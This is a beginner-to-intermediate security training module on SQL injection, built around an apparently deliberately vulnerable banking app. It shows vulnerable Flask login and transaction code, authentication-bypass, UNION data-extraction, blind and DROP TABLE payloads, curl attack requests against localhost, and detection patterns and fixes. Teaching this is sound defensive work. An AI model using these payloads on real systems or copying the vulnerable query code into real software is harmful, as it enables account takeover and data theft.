# Module 1: SQL Injection Vulnerabilities

## 🎓 For Beginners: Understanding SQL Injection

### What is SQL Injection?
Imagine you're using an ATM. Normally, you insert your card and enter your PIN to access your account. SQL Injection is like finding a way to trick the ATM into giving you access without knowing the correct PIN. In web applications, instead of a PIN, we're dealing with SQL queries - the commands that applications use to talk to their databases.

### How Does It Work? A Simple Example
Let's say a banking application has this login form:
- Username field
- Password field

When you enter your username (let's say "alice") and password ("secret123"), the application creates a SQL query like this:
```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
```

But what if someone enters this as the username: `' OR '1'='1`
The query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `1=1` is always true, this tricks the database into letting them in! It's like telling the ATM "let me in if my PIN is correct OR if 1 equals 1" - and since 1 always equals 1, you get in.

### Real-World Impact
Think about what this means for a bank:
1. 🔑 Attackers can log in as any user
2. 💰 They could transfer money from other accounts
3. 📱 They could steal personal information
4. 🏦 The bank could lose millions and its reputation

### Common Attack Types for Beginners

#### 1. Authentication Bypass
```sql
-- Original query
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'

-- Attack input: username: ' OR '1'='1' --
-- Resulting query (-- makes the rest a comment)
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
```

#### 2. Data Theft
```sql
-- Original query
SELECT * FROM users WHERE username = 'alice'

-- Attack input: alice' UNION SELECT cardnumber,pin FROM creditcards--
-- This tries to steal credit card data!
```

### How to Spot SQL Injection Vulnerabilities
Look for places where:
1. 🔍 User input goes into database queries
2. 🔍 Error messages show SQL syntax
3. 🔍 URLs have database parameters like `id=1`

### Simple Tests for Beginners
Try entering these in login forms:
1. `' OR '1'='1`
2. `admin'--`
3. `' OR 1=1--`
4. `'; DROP TABLE users--` (⚠️ Never try this on real systems!)

### Protection for Beginners

#### 1. Use Prepared Statements
❌ Unsafe way:
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```

✅ Safe way:
```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, [username])
```

#### 2. Input Validation
❌ Unsafe way:
```python
username = request.form['username']
# Use directly in query
```

✅ Safe way:
```python
def is_safe_username(username):
    return username.isalnum() and len(username) <= 30

username = request.form['username']
if not is_safe_username(username):
    return "Invalid username"
```

#### 3. Use an ORM (Object-Relational Mapping)
❌ Unsafe way:
```python
query = f"SELECT * FROM users WHERE id = {user_id}"
```

✅ Safe way:
```python
user = User.query.get(user_id)  # Using SQLAlchemy ORM
```

### Practical Exercise for Beginners
1. Set up a test database with a simple users table
2. Create a basic login form
3. Try these steps:
   - First, make it vulnerable (use string concatenation)
   - Try the attack examples above
   - Fix it using prepared statements
   - Try the attacks again - they should fail!

### Warning Signs (What to Look For)
1. 🚩 String concatenation in SQL queries
2. 🚩 Direct use of user input in queries
3. 🚩 Error messages that reveal SQL syntax
4. 🚩 No input validation
5. 🚩 Using root database privileges for application

## Overview
SQL Injection remains one of the most critical web application vulnerabilities (OWASP Top 10 - A03:2021). This module examines real SQL injection vulnerabilities in our banking application's authentication and transaction systems.

## Vulnerable Code Examples

### 1. Authentication Bypass (auth_routes.py)
```python
@auth_bp.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    
    # Vulnerable SQL query
    query = f"SELECT * FROM user WHERE username = '{username}'"
    user = db.session.execute(query).fetchone()
```

### 2. Transaction History Query (transaction_routes.py)
```python
def get_user_transactions(user_id):
    query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
    return db.session.execute(query).fetchall()
```

## Attack Vectors

### 1. Authentication Bypass
#### Basic Authentication Bypass
```bash
# Payload: ' OR '1'='1
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "' OR '1'='1", "password": "anything"}'
```

#### Union-Based Attack
```bash
# Payload: ' UNION SELECT 1,2,'admin','hash',5,6,7,8,9 FROM user--
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice' UNION SELECT 1,2,'admin','hash',5,6,7,8,9 FROM user--", "password": "anything"}'
```

### 2. Data Extraction
#### Extracting User Data
```sql
-- Extract usernames and password hashes
' UNION SELECT id, username, password_hash, NULL FROM user--

-- Extract balance information
' UNION SELECT id, username, balance, NULL FROM user WHERE balance > 1000--
```

#### Time-Based Blind Injection
```sql
-- Check if admin user exists
' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM user WHERE username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

## Impact Analysis

### 1. Business Impact
- Unauthorized account access
- Financial fraud
- Data breach
- Reputation damage
- Regulatory compliance violations

### 2. Technical Impact
- Database compromise
- Data manipulation
- Information disclosure
- System access
- Audit log manipulation

## Detection Methods

### 1. Static Analysis
```python
def find_sql_injection(code_file):
    vulnerable_patterns = [
        r"execute\([\"'].*?\{.*?\}.*?[\"']\)",
        r"execute\(f[\"'].*?[\"']\)",
        r"execute\([\"'].*?\+.*?[\"']\)",
        r"raw_connection\.execute\([\"'].*?[\"']\)"
    ]
    # Implementation details...
```

### 2. Dynamic Analysis
```python
def test_sql_injection_vectors():
    vectors = [
        "' OR '1'='1",
        "admin'--",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "'; WAITFOR DELAY '0:0:5'--"
    ]
    # Implementation details...
```

## Prevention Techniques

### 1. Use ORM Methods
```python
# Instead of raw SQL
user = User.query.filter_by(username=username).first()

# For complex queries
from sqlalchemy import and_, or_
users = User.query.filter(
    and_(
        User.active == True,
        or_(
            User.role == 'admin',
            User.department == 'security'
        )
    )
).all()
```

### 2. Parameterized Queries
```python
# Using SQLAlchemy parameterized queries
query = "SELECT * FROM user WHERE username = :username"
result = db.session.execute(query, {'username': username})

# Using prepared statements
from sqlite3 import connect
conn = connect('database.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM user WHERE username = ?", (username,))
```

### 3. Input Validation
```python
def validate_sql_input(value: str) -> bool:
    # Check for SQL injection patterns
    sql_patterns = [
        '--', ';', 'UNION', 'SELECT', 'DROP',
        'DELETE', 'UPDATE', 'INSERT', 'EXEC'
    ]
    
    # Convert to lowercase for pattern matching
    value_lower = value.lower()
    
    # Check for SQL patterns
    for pattern in sql_patterns:
        if pattern.lower() in value_lower:
            return False
            
    # Check for valid characters
    if not all(c.isalnum() or c in '-_@.' for c in value):
        return False
        
    return True
```

### 4. Secure Query Building
```python
class SecureQueryBuilder:
    def __init__(self):
        self.conditions = []
        self.parameters = {}
        
    def add_condition(self, field: str, operator: str, value: any):
        param_name = f"param_{len(self.parameters)}"
        self.conditions.append(f"{field} {operator} :{param_name}")
        self.parameters[param_name] = value
        
    def build(self) -> tuple[str, dict]:
        query = " AND ".join(self.conditions)
        return query, self.parameters

# Usage
builder = SecureQueryBuilder()
builder.add_condition("username", "=", user_input)
builder.add_condition("active", "=", True)
query, params = builder.build()
result = db.session.execute(f"SELECT * FROM users WHERE {query}", params)
```

## Security Testing

### 1. Automated Testing
```python
import pytest
from app import app

def test_sql_injection_login():
    vectors = [
        ("' OR '1'='1", None),
        ("admin'--", None),
        ("normal_user", "password123")
    ]
    
    with app.test_client() as client:
        for username, password in vectors:
            response = client.post('/api/login', json={
                'username': username,
                'password': password
            })
            if password is None:
                assert response.status_code == 401
```

### 2. Manual Testing Checklist
- [ ] Test each input field for SQL injection
- [ ] Try different injection techniques
- [ ] Test error messages for information disclosure
- [ ] Check for blind SQL injection
- [ ] Verify parameterized queries
- [ ] Test input validation bypass
- [ ] Check for second-order injection

## Additional Security Measures

### 1. Database User Privileges
```sql
-- Create restricted user for application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON banking_db.* TO 'app_user'@'localhost';
REVOKE DROP, ALTER, CREATE ON banking_db.* FROM 'app_user'@'localhost';
```

### 2. Error Handling
```python
def safe_database_query(query: str, params: dict) -> Optional[Any]:
    try:
        return db.session.execute(query, params)
    except SQLAlchemyError as e:
        logger.error(f"Database error: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
```

### 3. Query Timeouts
```python
from contextlib import contextmanager
from sqlalchemy import event
from sqlalchemy.engine import Engine
import time

@contextmanager
def query_timeout(seconds: int):
    start = time.time()
    yield
    if time.time() - start > seconds:
        raise Exception("Query timeout exceeded")

# Usage
with query_timeout(5):
    result = db.session.execute(query)
```

## Practice Exercises

### Exercise 1: Find Injection Points
1. Review the codebase for potential SQL injection points
2. Document each vulnerable endpoint
3. Create PoC exploits
4. Implement secure fixes

### Exercise 2: Implement Security Controls
1. Add input validation
2. Implement parameterized queries
3. Create secure query builder
4. Add logging and monitoring

### Exercise 3: Security Testing
1. Write automated tests
2. Perform manual testing
3. Document findings
4. Verify fixes

## Additional Resources
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [NIST SQL Injection Prevention Guide](https://www.nist.gov/publications/software-security-guide-sql-injection) 